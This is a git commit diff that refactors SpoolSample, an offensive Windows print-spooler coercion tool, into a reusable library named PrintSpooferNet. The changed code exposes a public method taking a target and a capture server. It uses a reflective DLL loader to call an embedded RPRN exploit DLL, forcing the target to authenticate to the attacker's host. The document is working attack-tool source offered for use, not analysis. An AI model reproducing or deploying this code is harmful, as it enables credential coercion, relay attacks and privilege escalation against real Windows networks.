d0b71dcb629f36f3eb5ddcf652e9e3bebf787196
NukingDragons <nukingdragons@utd.tf>
2023-03-28 12:51:10 -0400

    Push from local repo

--- SpoolSample/Properties/AssemblyInfo.cs
+++ SpoolSample/Properties/AssemblyInfo.cs
@@ -5,12 +5,12 @@ using System.Runtime.InteropServices;
 // General Information about an assembly is controlled through the following
 // set of attributes. Change these attribute values to modify the information
 // associated with an assembly.
-[assembly: AssemblyTitle("SpoolSample")]
+[assembly: AssemblyTitle("PrintSpooferNet")]
 [assembly: AssemblyDescription("")]
 [assembly: AssemblyConfiguration("")]
 [assembly: AssemblyCompany("")]
-[assembly: AssemblyProduct("SpoolSample")]
-[assembly: AssemblyCopyright("Copyright ©  2018")]
+[assembly: AssemblyProduct("PrintSpooferNet")]
+[assembly: AssemblyCopyright("Copyright ©  2023")]
 [assembly: AssemblyTrademark("")]
 [assembly: AssemblyCulture("")]
 
--- SpoolSample/SpoolSample.cs
+++ SpoolSample/SpoolSample.cs
@@ -4,18 +4,13 @@ using RDI;
 
 namespace SpoolSample
 {
-    class SpoolSample
+    public class SpoolSample
     {
         // FYI, there might be reliability issues with this. The MS-RPRN project is more reliable 
-        static void Main(string[] args)
+        public void ExecSpoolSample(string target, string captureserver)
         {
-            if (args.Length != 2)
-            {
-                Console.WriteLine("Invalid number of args. Syntax: SpoolSample.exe TARGET CAPTURESERVER");
-                return;
-            }
 
-            byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{args[0]} \\\\{args[1]}");
+            byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{target} \\\\{captureserver}");
             
             RDILoader.CallExportedFunction(Data.RprnDll, "DoStuff", commandBytes);
         }
